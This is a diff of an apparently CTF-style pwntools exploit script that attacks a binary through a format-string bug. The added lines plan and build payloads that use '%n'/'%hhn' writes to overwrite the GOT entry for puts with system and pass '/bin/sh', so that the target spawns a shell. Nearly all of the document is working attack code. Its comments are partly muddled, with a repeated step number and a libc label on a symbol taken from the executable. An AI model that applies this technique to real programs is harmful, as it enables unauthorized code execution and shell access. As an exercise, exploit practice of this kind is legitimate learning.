@@ -64,16 +64,28 @@ def main():
 
   ########################################################
 
+    # 1: leak libc base address -> ?
+    # 2: override got.puts with got.system (system was called)
+    # 2: prepare the stack with system() argument so "/bin/sh"
+    # 3: arrive where the code calls puts so it calls system
+
     payload = p32(0xFFC709FC, endianness = 'little') + b'aaa%n'
-    print('GOT.PUTS')
-    print(exe.got.puts)
+    print('GOT')
+    print(exe.got)
     print('PLT')
     print(exe.plt)
     cycle_input(r, payload)
+    print('libc.symbols["system"]' + str(exe.symbols["system"]))
+
 
     # write at %15 offset (buffer starts there)
     # target = 0x0804A2A0
-    payload = p32(0x08048f0f, endianness = 'little') + b'a'*96 + b'%14$hhn' #write 1 byte into n
+    # write 24 (0x18) at 0804a2a0 (plt.puts) to call system instead
+    payload = p32(0x0804a2a0, endianness = 'little') + b'a'*32 + b'%15$hhn' 
+    #b'%150$hhn' #write 1 byte into n
+    print(b'PAYLOAD: ' + payload)
+    string = "/bin/sh"
+    print(b'/bin/sh = ' + bytes(string, 'utf-8'))
     r.sendline(payload)
     data = r.recvline()
     print(data)
